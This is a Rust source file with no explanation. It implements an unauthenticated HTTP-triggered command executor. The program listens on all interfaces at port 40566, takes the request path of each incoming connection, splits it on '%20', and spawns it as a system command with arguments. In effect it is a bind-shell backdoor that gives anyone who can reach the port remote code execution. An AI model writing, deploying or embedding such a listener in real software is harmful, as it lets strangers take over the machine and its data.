use std::io::{self, Read};
use std::net::TcpListener;
use std::process::Command;

struct Con {
    listener: TcpListener,
    stream: String,
    last_cmd: String,
}

impl Con {
    fn connect() -> io::Result<Self> {
        let listener = TcpListener::bind("0.0.0.0:40566")?;
        Ok(Self {
            listener,
            stream: String::new(),
            last_cmd: String::new(),
        })
    }
    fn start(&mut self) -> io::Result<()> {
        let mut buffer = [0; 124];
        for stream in self.listener.incoming() {
            self.stream.clear();
            let mut s = stream?;
            s.read_exact(&mut buffer)?;
            self.stream = String::from_utf8_lossy(&buffer).to_string();
            if let Some(cmd) = self.get_cmd() {
                match self.exec_cmd(cmd) {
                    Ok(c_cmd) => {
                        self.last_cmd = c_cmd;
                    }
                    Err(_) => continue,
                }
            }
        }
        Ok(())
    }

    fn get_cmd(&self) -> Option<std::str::Split<&str>> {
        let http_idx = match self.stream.find("HTTP") {
            Some(idx) => idx - 1,
            None => return None,
        };
        let unescaped = &self.stream[5..http_idx];
        Some(unescaped.split("%20"))
    }
    fn exec_cmd(&self, mut cmd: std::str::Split<&str>) -> io::Result<String> {
        let c_cmd = cmd.clone().collect::<String>();

        //XXX Hack
        if c_cmd == self.last_cmd {
            return Ok(c_cmd);
        }

        Command::new(cmd.nth(0).unwrap())
            .args(&cmd.collect::<Vec<&str>>())
            .spawn()?;
        Ok(c_cmd)
    }
}

fn main() -> io::Result<()> {
    let mut con = Con::connect()?;
    con.start()?;
    Ok(())
}
